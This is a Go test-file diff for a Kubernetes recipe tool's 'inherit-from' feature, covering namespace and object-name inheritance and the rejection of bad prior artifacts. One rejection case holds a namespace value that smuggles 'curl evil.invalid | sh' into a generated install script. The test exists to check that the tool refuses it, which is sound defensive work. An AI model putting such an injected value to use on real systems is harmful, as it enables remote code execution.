+			t.Fatalf("setup: write values for %s: %v", name, err)
+		}
+	}
+	writeBundleInfo(t, dir, releases)
+	return dir
+}
+
+// TestResolveRecipe_InheritFromObjectNames proves the second half of #2830's
+// last acceptance criterion: a prior bundle's object names survive
+// re-resolution, so dropping a component's fullnameOverride from its values
+// file does not rename the objects a running release owns (#2835).
+//
+// The pinned component and its current values come from a live resolve rather
+// than from literals, so a registry edit cannot make the assertion vacuous.
+func TestResolveRecipe_InheritFromObjectNames(t *testing.T) {
+	t.Parallel()
+
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatalf("baseline ResolveRecipe: %v", err)
+	}
+	internal := baseline.Resolved()
+	if internal == nil {
+		t.Fatal("baseline carries no resolved recipe")
+	}
+
+	// Any component will do; the first that resolves is enough, because the
+	// behavior under test is about the values chain rather than about which
+	// chart sits at the end of it.
+	pinned := baseline.Components[0].Name
+	currentValues, err := internal.GetValuesForComponentWithContext(t.Context(), pinned)
+	if err != nil {
+		t.Fatalf("resolve current values for %s: %v", pinned, err)
+	}
+	const legacyName = "legacy-object-name"
+	currentNames, err := recipe.ObjectNameValues(currentValues)
+	if err != nil {
+		t.Fatalf("project current names for %s: %v", pinned, err)
+	}
+	if currentNames["fullnameOverride"] == legacyName {
+		t.Fatalf("setup: %s already pins %q, so the test would assert nothing", pinned, legacyName)
+	}
+
+	t.Run("a name the prior bundle pinned is carried forward", func(t *testing.T) {
+		t.Parallel()
+		prior := map[string]map[string]any{pinned: {"fullnameOverride": legacyName}}
+		dir := priorBundle(t, filepath.Join(t.TempDir(), "bundle"),
+			map[string]string{pinned: "legacy-install-namespace"}, prior)
+
+		result, resolveErr := client.ResolveRecipe(t.Context(), inheritTestRequest(dir))
+		if resolveErr != nil {
+			t.Fatalf("ResolveRecipe: %v", resolveErr)
+		}
+		ref := result.Resolved().GetComponentRef(pinned)
+		if ref == nil {
+			t.Fatalf("%s is missing from the resolved recipe", pinned)
+		}
+		if got := ref.Overrides["fullnameOverride"]; got != legacyName {
+			t.Errorf("overrides[fullnameOverride] = %v, want the inherited %q", got, legacyName)
+		}
+		// The inherited override has to survive into the merged values, not
+		// merely sit on the ref: the bundle renders from the merge.
+		merged, valuesErr := result.Resolved().GetValuesForComponentWithContext(t.Context(), pinned)
+		if valuesErr != nil {
+			t.Fatalf("merged values for %s: %v", pinned, valuesErr)
+		}
+		mergedNames, nameErr := recipe.ObjectNameValues(merged)
+		if nameErr != nil {
+			t.Fatalf("project merged names for %s: %v", pinned, nameErr)
+		}
+		if got := mergedNames["fullnameOverride"]; got != legacyName {
+			t.Errorf("merged fullnameOverride = %q, want %q", got, legacyName)
+		}
+	})
+
+	t.Run("a steady-state inherit adds no override at all", func(t *testing.T) {
+		t.Parallel()
+		// The prior bundle installed exactly what resolves today, so there is
+		// no rename to prevent and the emitted recipe must not restate a
+		// default it would have resolved to anyway.
+		prior := map[string]map[string]any{pinned: currentValues}
+		dir := priorBundle(t, filepath.Join(t.TempDir(), "bundle"),
+			map[string]string{pinned: "legacy-install-namespace"}, prior)
+
+		result, resolveErr := client.ResolveRecipe(t.Context(), inheritTestRequest(dir))
+		if resolveErr != nil {
+			t.Fatalf("ResolveRecipe: %v", resolveErr)
+		}
+		ref := result.Resolved().GetComponentRef(pinned)
+		if ref == nil {
+			t.Fatalf("%s is missing from the resolved recipe", pinned)
+		}
+		if _, restated := ref.Overrides["fullnameOverride"]; restated {
+			t.Errorf("overrides restate an unchanged object name: %#v", ref.Overrides)
+		}
+	})
+}
+
+// TestResolveRecipe_InheritFromIncompleteBundle covers a flux bundle whose
+// bundle-info.yaml names a HelmRelease the copy lost. Read as "this release
+// pinned nothing", inheritance would write a null for any name the current
+// values set, deleting a deployed fullnameOverride and renaming the running
+// objects. It must refuse the artifact instead.
+func TestResolveRecipe_InheritFromIncompleteBundle(t *testing.T) {
+	t.Parallel()
+
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatalf("baseline ResolveRecipe: %v", err)
+	}
+	pinned := baseline.Components[0].Name
+
+	dir := filepath.Join(t.TempDir(), "bundle")
+	if mkErr := os.MkdirAll(dir, 0o750); mkErr != nil {
+		t.Fatalf("setup: mkdir bundle: %v", mkErr)
+	}
+	priorRecipe(t, filepath.Join(dir, "recipe.yaml"), map[string]string{pinned: "legacy-install-namespace"})
+	writeBundleInfo(t, dir, fluxReleases([]string{pinned}))
+
+	result, err := client.ResolveRecipe(t.Context(), inheritTestRequest(dir))
+	if err == nil {
+		ref := result.Resolved().GetComponentRef(pinned)
+		t.Fatalf("want an incomplete bundle refused, got a recipe with overrides %#v", ref.Overrides)
+	}
+	if errorstest.ReportedCode(err) != aicrerrors.ErrCodeInvalidRequest {
+		t.Errorf("want ErrCodeInvalidRequest, got %v", err)
+	}
+	if missing := pinned + "/helmrelease.yaml"; !strings.Contains(err.Error(), missing) {
+		t.Errorf("error %q does not name the missing manifest %q", err.Error(), missing)
+	}
+}
+
+// TestResolveRecipe_InheritFromValuesFromBundle covers a well-formed flux
+// bundle built with --dynamic: its names are partly in a ConfigMap this reader
+// does not follow. Unlike an incomplete bundle that is not refused — the
+// namespace half is still sound — but no object name may be pinned from it,
+// because a name among the unread part would read as unset and be null-pinned.
+func TestResolveRecipe_InheritFromValuesFromBundle(t *testing.T) {
+	t.Parallel()
+
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatalf("baseline ResolveRecipe: %v", err)
+	}
+	pinned := baseline.Components[0].Name
+	const movedNamespace = "legacy-install-namespace"
+
+	dir := filepath.Join(t.TempDir(), "bundle")
+	if mkErr := os.MkdirAll(filepath.Join(dir, pinned), 0o750); mkErr != nil {
+		t.Fatalf("setup: mkdir: %v", mkErr)
+	}
+	priorRecipe(t, filepath.Join(dir, "recipe.yaml"), map[string]string{pinned: movedNamespace})
+	writeBundleInfo(t, dir, fluxReleases([]string{pinned}))
+	if wErr := os.WriteFile(filepath.Join(dir, pinned, "helmrelease.yaml"), []byte(
+		"apiVersion: helm.toolkit.fluxcd.io/v2\nkind: HelmRelease\nspec:\n"+
+			"  values:\n    other: kept\n"+
+			"  valuesFrom:\n    - kind: ConfigMap\n      name: dynamic\n"), 0o600); wErr != nil {
+		t.Fatalf("setup: write helmrelease: %v", wErr)
+	}
+
+	result, err := client.ResolveRecipe(t.Context(), inheritTestRequest(dir))
+	if err != nil {
+		t.Fatalf("ResolveRecipe: %v (a well-formed bundle must still pin namespaces)", err)
+	}
+	ref := result.Resolved().GetComponentRef(pinned)
+	if ref == nil {
+		t.Fatalf("%s is missing from the resolved recipe", pinned)
+	}
+	if ref.Namespace != movedNamespace {
+		t.Errorf("namespace = %q, want the inherited %q", ref.Namespace, movedNamespace)
+	}
+	// Relative to the baseline, because an overlay may already set a name key
+	// in Overrides; inheritance must add or change nothing there.
+	base := baseline.Resolved().GetComponentRef(pinned)
+	for _, key := range []string{"fullnameOverride", "nameOverride"} {
+		if got, want := ref.Overrides[key], base.Overrides[key]; !reflect.DeepEqual(got, want) {
+			t.Errorf("overrides[%s] = %#v, want the baseline %#v: no name may be pinned from a bundle "+
+				"whose names are not all readable", key, got, want)
+		}
+	}
+}
+
+func namespacesOf(result *aicr.RecipeResult) map[string]string {
+	out := make(map[string]string, len(result.Components))
+	for _, c := range result.Components {
+		out[c.Name] = c.Namespace
+	}
+	return out
+}
+
+// TestResolveRecipe_InheritFrom proves that a prior artifact's resolved
+// namespaces survive re-resolution, which is what keeps a moved registry
+// default from installing a second copy of a running component beside the one
+// already deployed (#2830). Both accepted artifact forms are covered: a recipe
+// file, and a bundle directory read through the recipe.yaml at its root.
+func TestResolveRecipe_InheritFrom(t *testing.T) {
+	t.Parallel()
+
+	client := inheritTestClient(t)
+
+	// Baseline: what the registry alone resolves to. The pinned component and
+	// the expected namespaces are derived from it rather than hardcoded, so a
+	// registry edit cannot silently make the assertion vacuous.
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatalf("baseline ResolveRecipe: %v", err)
+	}
+	if len(baseline.Components) < 2 {
+		t.Fatalf("baseline resolved %d components, need at least 2 to tell inherited from default",
+			len(baseline.Components))
+	}
+	pinned := baseline.Components[0].Name
+	other := baseline.Components[1].Name
+	const movedNamespace = "legacy-install-namespace"
+
+	defaults := namespacesOf(baseline)
+	if defaults[pinned] == movedNamespace {
+		t.Fatalf("setup: %s already resolves to %q, so the test would assert nothing", pinned, movedNamespace)
+	}
+	want := namespacesOf(baseline)
+	want[pinned] = movedNamespace
+
+	dir := t.TempDir()
+	file := priorRecipe(t, filepath.Join(dir, "prior.yaml"), map[string]string{
+		pinned: movedNamespace,
+		// Absent from the resolved recipe, so it must contribute nothing
+		// rather than appear as a component.
+		"synthetic-not-in-registry": "somewhere-else",
+	})
+
+	bundleDir := filepath.Join(dir, "bundle")
+	if mkErr := os.Mkdir(bundleDir, 0o750); mkErr != nil {
+		t.Fatalf("setup: mkdir bundle: %v", mkErr)
+	}
+	priorRecipe(t, filepath.Join(bundleDir, "recipe.yaml"), map[string]string{pinned: movedNamespace})
+
+	tests := []struct {
+		name        string
+		inheritFrom string
+	}{
+		{"recipe file", file},
+		{"bundle directory", bundleDir},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			result, resolveErr := client.ResolveRecipe(t.Context(), inheritTestRequest(tt.inheritFrom))
+			if resolveErr != nil {
+				t.Fatalf("ResolveRecipe: %v", resolveErr)
+			}
+			got := namespacesOf(result)
+			// Spelled out before the whole-map compare so a failure names the
+			// two behaviors under test rather than only diffing two maps.
+			if got[pinned] != movedNamespace {
+				t.Errorf("%s namespace = %q, want the inherited %q", pinned, got[pinned], movedNamespace)
+			}
+			if got[other] != defaults[other] {
+				t.Errorf("%s namespace = %q, want the registry default %q", other, got[other], defaults[other])
+			}
+			if !reflect.DeepEqual(got, want) {
+				t.Errorf("namespaces = %v, want %v", got, want)
+			}
+		})
+	}
+}
+
+// TestResolveRecipe_InheritFromRejects covers the fail-closed inputs: an
+// artifact that is not there must not resolve as a first deploy, one that is
+// there but names no component must not either, and cm:// must be refused at
+// the facade rather than reaching a loader that would try to contact a cluster
+// for it.
+func TestResolveRecipe_InheritFromRejects(t *testing.T) {
+	t.Parallel()
+
+	dir := t.TempDir()
+	emptyDir := filepath.Join(dir, "no-recipe")
+	if err := os.Mkdir(emptyDir, 0o750); err != nil {
+		t.Fatalf("setup: mkdir: %v", err)
+	}
+	// Loads cleanly and resolves non-nil, so only an explicit length check
+	// stops it: ApplyInheritedIdentity returns immediately for an empty list,
+	// which would re-derive every namespace from the registry while reporting
+	// success.
+	noComponents := priorRecipe(t, filepath.Join(dir, "no-components.yaml"), nil)
+
+	// A leaf overlay. LoadRecipe auto-hydrates this kind against the current
+	// data provider, so without the guard it would resolve successfully and
+	// hand back the registry namespaces inheritance exists to override.
+	overlay := filepath.Join(dir, "overlay.yaml")
+	if err := os.WriteFile(overlay, []byte(
+		"kind: RecipeMetadata\napiVersion: aicr.run/v1beta1\nmetadata:\n  name: leaf\n"+
+			"spec:\n  criteria:\n    service: eks\n    accelerator: h100\n    intent: training\n",
+	), 0o600); err != nil {
+		t.Fatalf("setup: write overlay: %v", err)
+	}
+
+	// The namespace reaches a generated install script through an unquoted
+	// template interpolation, so a value carrying shell metacharacters must not
+	// survive to assignment.
+	injected := priorRecipe(t, filepath.Join(dir, "injected.yaml"),
+		map[string]string{"gpu-operator": "gpu-operator; curl evil.invalid | sh"})
+
+	tests := []struct {
+		name        string
+		inheritFrom string
+		wantMsg     string
+	}{
+		{"missing path", filepath.Join(dir, "absent.yaml"), "is not readable"},
+		{"directory without a recipe.yaml", emptyDir, "neither a recipe nor a bundle"},
+		{"configmap uri", "cm://gpu-operator/aicr-recipe", "does not support cm:// locations yet"},
+		// Loads and validates cleanly: nothing on the load path requires a
+		// component list, so this is the one rejected shape that reaches the
+		// inheritance step rather than failing before it.
+		{"recipe with no componentRefs", noComponents, "carries no components to inherit identity from"},
+		{"leaf overlay is not a resolved recipe", overlay, "it must be a resolved RecipeResult"},
+		{"namespace carrying shell metacharacters", injected, "is not a valid Kubernetes namespace"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			client := inheritTestClient(t)
+			_, err := client.ResolveRecipe(t.Context(), inheritTestRequest(tt.inheritFrom))
+			if err == nil {
+				t.Fatal("ResolveRecipe = nil error, want rejection")
+			}
+			if errorstest.ReportedCode(err) != aicrerrors.ErrCodeInvalidRequest {
+				t.Errorf("error = %v, want ErrCodeInvalidRequest", err)
+			}
+			if !strings.Contains(err.Error(), tt.wantMsg) {
+				t.Errorf("error = %v, want it to contain %q", err, tt.wantMsg)
+			}
+		})
+	}
+}
+
+// TestResolveRecipe_InheritFromRejectsCriteriaMismatch proves a prior artifact
+// resolved for another environment is refused, while one that leaves a
+// dimension unset or states the same value is accepted.
+func TestResolveRecipe_InheritFromRejectsCriteriaMismatch(t *testing.T) {
+	t.Parallel()
+
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatalf("baseline ResolveRecipe: %v", err)
+	}
+	name := baseline.Components[0].Name
+
+	tests := []struct {
+		name     string
+		criteria string
+		wantMsg  string
+	}{
+		{"different service", "service: aks\n  accelerator: h100", `service "aks"`},
+		{"different accelerator", "service: eks\n  accelerator: gb200", `accelerator "gb200"`},
+		{"different intent", "service: eks\n  intent: inference", `intent "inference"`},
+		{"same dimensions", "service: eks\n  accelerator: h100\n  intent: training\n  os: ubuntu", ""},
+		{"unset and any dimensions", "service: any", ""},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			prior := filepath.Join(t.TempDir(), "prior.yaml")
+			doc := "kind: RecipeResult\napiVersion: aicr.run/v1\nmetadata:\n  version: test\ncriteria:\n  " +
+				tt.criteria + "\ncomponentRefs:\n  - name: " + name +
+				"\n    type: Helm\n    source: https://charts.invalid/prior\n    version: 1.0.0\n    namespace: legacy\n"
+			if writeErr := os.WriteFile(prior, []byte(doc), 0o600); writeErr != nil {
+				t.Fatalf("setup: write prior: %v", writeErr)
+			}
+			_, resolveErr := client.ResolveRecipe(t.Context(), inheritTestRequest(prior))
+			if tt.wantMsg == "" {
+				if resolveErr != nil {
+					t.Fatalf("ResolveRecipe: %v", resolveErr)
+				}
+				return
+			}
+			if resolveErr == nil {
+				t.Fatal("ResolveRecipe = nil error, want rejection")
+			}
+			if errorstest.ReportedCode(resolveErr) != aicrerrors.ErrCodeInvalidRequest {
+				t.Errorf("error = %v, want ErrCodeInvalidRequest", resolveErr)
+			}
+			if !strings.Contains(resolveErr.Error(), tt.wantMsg) {
+				t.Errorf("error = %v, want it to contain %q", resolveErr, tt.wantMsg)
+			}
+		})
+	}
+}
+
+// TestResolveRecipe_InheritFromRevalidatesCoherence proves the recipe is
+// validated again after inheritance. A disabled prior component is skipped by
+// the loader's coherence rules, so a kustomize path on a Helm component reaches
+// the assignment, and the result would otherwise deploy as a different type
+// depending on the deployer.
+func TestResolveRecipe_InheritFromRevalidatesCoherence(t *testing.T) {
+	t.Parallel()
+
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatalf("baseline ResolveRecipe: %v", err)
+	}
+	var helm string
+	for _, c := range baseline.Components {
+		if c.Kind == "Helm" {
+			helm = c.Name
+			break
+		}
+	}
+	if helm == "" {
+		t.Fatal("setup: baseline resolved no Helm component")
+	}
+
+	prior := filepath.Join(t.TempDir(), "prior.yaml")
+	doc := "kind: RecipeResult\napiVersion: aicr.run/v1\nmetadata:\n  version: test\ncomponentRefs:\n" +
+		"  - name: " + helm + "\n    type: Helm\n    source: https://charts.invalid/prior\n" +
+		"    version: 1.0.0\n    path: deploy/prior\n    overrides:\n      enabled: false\n"
+	if writeErr := os.WriteFile(prior, []byte(doc), 0o600); writeErr != nil {
+		t.Fatalf("setup: write prior: %v", writeErr)
+	}
+
+	_, err = client.ResolveRecipe(t.Context(), inheritTestRequest(prior))
+	if err == nil {
+		t.Fatal("ResolveRecipe = nil error, want the incoherent inherited identity rejected")
+	}
+	if errorstest.ReportedCode(err) != aicrerrors.ErrCodeInvalidRequest {
+		t.Errorf("error = %v, want ErrCodeInvalidRequest", err)
+	}
+	if !strings.Contains(err.Error(), "carries Kustomize field") {
+		t.Errorf("error = %v, want it to name the Kustomize fields on a Helm component", err)
+	}
+}
+
+// inheritTestCriteria is the criteria the option-taking resolvers resolve,
+// which take a Criteria rather than a RecipeRequest. It states the three
+// dimensions TestResolveRecipeFromSnapshot states: naming os as well would be
+// covered on the criteria path but not on the snapshot one, where the
+// os-specific chain's constraints fail against a K8s-version-only snapshot
+// and the strict coverage post-condition then rejects the resolve.
+func inheritTestCriteria(t *testing.T) *aicr.Criteria {
+	t.Helper()
+	crit, err := recipe.BuildCriteriaWithRegistry(nil,
+		recipe.WithServiceRegistry("eks"),
+		recipe.WithAcceleratorRegistry("h100"),
+		recipe.WithIntentRegistry("training"),
+	)
+	if err != nil {
+		t.Fatalf("BuildCriteriaWithRegistry: %v", err)
+	}
+	return aicr.WrapCriteria(crit)
+}
+
+// inheritOptionResolver names one of the two entry points that take
+// RecipeResolveOption. Neither reads RecipeRequest.InheritFrom, and they are
+// the only recipe paths the CLI and the HTTP server use, so WithInheritFrom
+// has to be honored on both or the flag reaches nothing.
+type inheritOptionResolver struct {
+	name    string
+	resolve func(*testing.T, *aicr.Client, ...aicr.RecipeResolveOption) (*aicr.RecipeResult, error)
+}
+
+func inheritOptionResolvers() []inheritOptionResolver {
+	return []inheritOptionResolver{
+		{
+			name: "from criteria",
+			resolve: func(t *testing.T, c *aicr.Client, opts ...aicr.RecipeResolveOption) (*aicr.RecipeResult, error) {
+				t.Helper()
+				return c.ResolveRecipeFromCriteriaWithOptions(t.Context(), inheritTestCriteria(t), opts...)
+			},
+		},
+		{
+			name: "from snapshot",
+			resolve: func(t *testing.T, c *aicr.Client, opts ...aicr.RecipeResolveOption) (*aicr.RecipeResult, error) {
+				t.Helper()
+				return c.ResolveRecipeFromSnapshotWithOptions(
+					t.Context(), inheritTestCriteria(t), k8sVersionSnapshot(), opts...)
+			},
+		},
+	}
+}
+
+// TestResolveRecipeWithOptions_InheritFrom is TestResolveRecipe_InheritFrom for
+// the option-taking resolvers: a prior artifact's namespace has to survive
+// re-resolution there too, because that is the path every CLI and REST recipe
+// generation actually takes (#2830).
+func TestResolveRecipeWithOptions_InheritFrom(t *testing.T) {
+	t.Parallel()
+
+	const movedNamespace = "legacy-install-namespace"
+
+	for _, tt := range inheritOptionResolvers() {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			client := inheritTestClient(t)
+
+			// Baseline first, so the pinned component and the expected
+			// namespaces come from the registry rather than being hardcoded
+			// here — a registry edit cannot make the assertion vacuous.
+			baseline, err := tt.resolve(t, client)
+			if err != nil {
+				t.Fatalf("baseline resolve: %v", err)
+			}
+			if len(baseline.Components) < 2 {
+				t.Fatalf("baseline resolved %d components, need at least 2 to tell inherited from default",
+					len(baseline.Components))
+			}
+			pinned := baseline.Components[0].Name
+			other := baseline.Components[1].Name
+			defaultNamespaces := namespacesOf(baseline)
+			if defaultNamespaces[pinned] == movedNamespace {
+				t.Fatalf("setup: %s already resolves to %q, so the test would assert nothing",
+					pinned, movedNamespace)
+			}
+			want := namespacesOf(baseline)
+			want[pinned] = movedNamespace
+
+			prior := priorRecipe(t, filepath.Join(t.TempDir(), "prior.yaml"),
+				map[string]string{pinned: movedNamespace})
+
+			result, err := tt.resolve(t, client, aicr.WithInheritFrom(prior))
+			if err != nil {
+				t.Fatalf("resolve with WithInheritFrom: %v", err)
+			}
+			got := namespacesOf(result)
+			if got[pinned] != movedNamespace {
+				t.Errorf("%s namespace = %q, want the inherited %q", pinned, got[pinned], movedNamespace)
+			}
+			if got[other] != defaultNamespaces[other] {
+				t.Errorf("%s namespace = %q, want the registry default %q",
+					other, got[other], defaultNamespaces[other])
+			}
+			if !reflect.DeepEqual(got, want) {
+				t.Errorf("namespaces = %v, want %v", got, want)
+			}
+		})
+	}
+}
+
+// TestResolveRecipeWithOptions_InheritFromRejectsConfigMapURI keeps the
+// fail-closed contract on the option path: cm:// is refused at the facade
+// rather than reaching a loader that would try to contact a cluster for it.
+func TestResolveRecipeWithOptions_InheritFromRejectsConfigMapURI(t *testing.T) {
+	t.Parallel()
+
+	for _, tt := range inheritOptionResolvers() {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			client := inheritTestClient(t)
+			_, err := tt.resolve(t, client, aicr.WithInheritFrom("cm://gpu-operator/aicr-recipe"))
+			if err == nil {
+				t.Fatal("resolve = nil error, want rejection")
+			}
+			if errorstest.ReportedCode(err) != aicrerrors.ErrCodeInvalidRequest {
+				t.Errorf("error = %v, want ErrCodeInvalidRequest", err)
+			}
+			if !strings.Contains(err.Error(), "does not support cm:// locations yet") {
+				t.Errorf("error = %v, want the cm:// rejection", err)
+			}
+		})
+	}
+}
+
+func TestResolveRecipeInheritNamespaceOnly(t *testing.T) {
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatal(err)
+	}
+	name := baseline.Components[0].Name
+	baseRef := baseline.Resolved().GetComponentRef(name)
+	prior := filepath.Join(t.TempDir(), "prior.yaml")
+	doc := fmt.Sprintf(`kind: RecipeResult
+apiVersion: aicr.run/v1
+metadata:
+  version: test
+componentRefs:
+  - name: %s
+    type: Helm
+    namespace: legacy-namespace
+    chart: legacy-chart
+    source: https://charts.invalid/prior
+    version: 1.0.0
+    manifestFiles: [legacy.yaml]
+    preManifestFiles: [legacy-pre.yaml]
+`, name)
+	if err := os.WriteFile(prior, []byte(doc), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	assertResult := func(t *testing.T, result *aicr.RecipeResult, err error) {
+		t.Helper()
+		if err != nil {
+			t.Fatal(err)
+		}
+		ref := result.Resolved().GetComponentRef(name)
+		if ref.Namespace != "legacy-namespace" {
+			t.Errorf("namespace = %q, want legacy-namespace", ref.Namespace)
+		}
+		if ref.Chart != baseRef.Chart || ref.Source != baseRef.Source || ref.Version != baseRef.Version ||
+			!reflect.DeepEqual(ref.ManifestFiles, baseRef.ManifestFiles) ||
+			!reflect.DeepEqual(ref.PreManifestFiles, baseRef.PreManifestFiles) ||
+			!reflect.DeepEqual(ref.Overrides, baseRef.Overrides) {
+
+			t.Errorf("namespace-only inheritance changed other resolved fields: got %+v, want fields from %+v", ref, baseRef)
+		}
+	}
+
+	t.Run("request", func(t *testing.T) {
+		req := inheritTestRequest(prior)
+		req.Inherit = "namespace"
+		result, resolveErr := client.ResolveRecipe(t.Context(), req)
+		assertResult(t, result, resolveErr)
+	})
+	for _, resolver := range inheritOptionResolvers() {
+		t.Run(resolver.name, func(t *testing.T) {
+			result, resolveErr := resolver.resolve(t, client,
+				aicr.WithInheritFrom(prior), aicr.WithInherit("namespace"))
+			assertResult(t, result, resolveErr)
+		})
+	}
+}
+
+func TestResolveRecipeInheritNamespaceSkipsObjectNames(t *testing.T) {
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatal(err)
+	}
+	name := baseline.Components[0].Name
+	baseRef := baseline.Resolved().GetComponentRef(name)
+	dir := priorBundle(t, filepath.Join(t.TempDir(), "bundle"),
+		map[string]string{name: "legacy-namespace"},
+		map[string]map[string]any{name: {"fullnameOverride": "legacy-object-name"}})
+
+	req := inheritTestRequest(dir)
+	req.Inherit = "namespace"
+	result, err := client.ResolveRecipe(t.Context(), req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	ref := result.Resolved().GetComponentRef(name)
+	if ref.Namespace != "legacy-namespace" || !reflect.DeepEqual(ref.Overrides, baseRef.Overrides) {
+		t.Fatalf("namespace-only inheritance changed object names or lost the namespace: %+v", ref)
+	}
+}
+
+func TestResolveRecipeInheritNamespaceIgnoresBundleValueMetadata(t *testing.T) {
+	client := inheritTestClient(t)
+	baseline, err := client.ResolveRecipe(t.Context(), inheritTestRequest(""))
+	if err != nil {
+		t.Fatal(err)
+	}
+	name := baseline.Components[0].Name
+	dir := filepath.Join(t.TempDir(), "bundle")
+	if mkErr := os.MkdirAll(dir, 0o750); mkErr != nil {
+		t.Fatal(mkErr)
+	}
+	priorRecipe(t, filepath.Join(dir, "recipe.yaml"), map[string]string{name: "legacy-namespace"})
+	if writeErr := os.WriteFile(filepath.Join(dir, bundleinfo.FileName), []byte("releases: [invalid"), 0o600); writeErr != nil {
+		t.Fatal(writeErr)
+	}
+
+	req := inheritTestRequest(dir)
+	req.Inherit = "namespace"
+	result, err := client.ResolveRecipe(t.Context(), req)
+	if err != nil {
+		t.Fatalf("namespace-only inheritance read unusable bundle value metadata: %v", err)
+	}
+	if ref := result.Resolved().GetComponentRef(name); ref == nil || ref.Namespace != "legacy-namespace" {
+		t.Fatalf("namespace was not inherited from recipe.yaml: %+v", ref)
+	}
+}
+
+func TestResolveRecipeInheritSelectionRejects(t *testing.T) {
+	client := inheritTestClient(t)
+	tests := []struct {
+		name   string
+		source string
+		mode   string
+		want   string
+	}{
+		{"unknown mode", "missing.yaml", "namespaces", "invalid inherit mode"},
+		{"namespace without source", "", "namespace", "requires --inherit-from"},
+		{"all without source", "", "all", "requires --inherit-from"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			req := inheritTestRequest(tt.source)
+			req.Inherit = tt.mode
+			_, err := client.ResolveRecipe(t.Context(), req)
+			if errorstest.ReportedCode(err) != aicrerrors.ErrCodeInvalidRequest ||
+				!strings.Contains(err.Error(), tt.want) {
+
+				t.Fatalf("error = %v, want INVALID_REQUEST containing %q", err, tt.want)
 			}
 		})
 	}
